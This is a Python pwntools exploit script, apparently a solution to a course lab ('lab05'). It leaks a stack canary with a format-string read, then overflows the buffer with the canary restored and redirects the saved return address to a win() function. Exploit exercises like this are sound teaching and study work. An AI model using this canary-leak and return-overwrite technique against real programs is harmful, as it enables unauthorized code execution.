from pwn import *

elf = ELF('./lab05')
p = process("./lab05")

#leak a canary
p.recvuntil(b"Stage 1:")
p.recvline()
p.sendline(b"%15$lx")
leak = p.recvline().strip()
p.recvuntil(b"Stage 2:")

#log.info(repr(leak))

try:
    canary = int(leak, 16)
    log.success(f"Canary Leaked: {hex(canary)}")
    
    #build a payload
    payload  = b"A" * 72   #buffer(64) + padding(8)
    payload += p64(canary) #canary
    payload += b"B" * 8    # old rbp
    payload += p64(0x401196) #saved rip to assign win() address

    try:
        p.send(payload)
        out = p.recvall().decode()
        log.success(f"Program received! : {out}")

        if args.INTERACTIVE:
            p.interactive()
        else:
            p.close()
    except Exception as e:
        log.info(f"Failed executing payload err={e}")
        p.close()
        exit()

except Exception as e:
    log.info(f"Canary Leaking Failed!....{leak!r} err={e}")
    p.close()
    exit()